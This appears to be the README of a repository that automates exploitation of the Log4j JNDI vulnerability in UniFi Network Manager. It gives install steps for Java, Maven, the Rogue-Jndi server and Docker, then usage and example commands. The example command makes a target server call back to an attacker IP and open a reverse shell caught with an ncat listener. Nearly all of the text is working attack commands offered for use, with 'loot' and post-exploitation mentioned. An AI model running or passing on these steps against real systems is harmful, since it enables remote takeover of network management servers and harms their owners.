# Why?

Proof of concepts for this vulnerability are scattered and have to be performed manually. This repository automates the exploitation process. See the blog post above for guidance on post-exploitation.

# Install

This repository can be used manually or with Docker.

### Manual install

To download and run the exploit manually, execute the following steps. First, ensure that Java and Maven are installed on your attacker host. To do this using apt on Debian based operating systems, run the following command:

```
apt update && apt install openjdk-11-jre maven
```

Clone the GitHub repository and install all python requirements:

```
git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jUnifi \
    && cd Log4jUnifi && pip3 install -r requirements.txt
```

From the root of the Log4jUnifi repository, compile the Rogue-Jndi project using the command below:

```
mvn package -f utils/rogue-jndi/
```

### Docker install

First, ensure that Docker is installed on your attacking host. (I am not going to walk you through doing this)

Following that, execute the following command to clone the repository and build the Docker image we will be using.

```
git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jUnifi \
    && cd Log4jUnifi && docker build -t Log4jUnifi .
```

To run the container, run a command similar to the following with your command line flags appended. Note that the container will not catch the reverse shell. You need to create a ncat listener in a separate shell session:

```
docker run -it -v $(pwd)/loot:/Log4jUnifi/loot -p 8090:8090 -p 1389:1389 Log4jUnifi \ 
    -u https://unifi.acme.com:8443 -i 192.168.1.1 -p 4444
```


# Usage

```
usage: exploit.py [-h] -u URL -i CALLBACK -p PORT

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Unifi Network Manager base URL
  -i CALLBACK, --ip CALLBACK
                        Callback IP for payload delivery and reverse shell.
  -p PORT, --port PORT  Callback port for reverse shell.
```

# Examples

Get a reverse shell using the tool installed on your local system:

```
python3 exploit.py -u https://unifi.acme.com:8443 -i 10.10.10.1 -p 4444
```
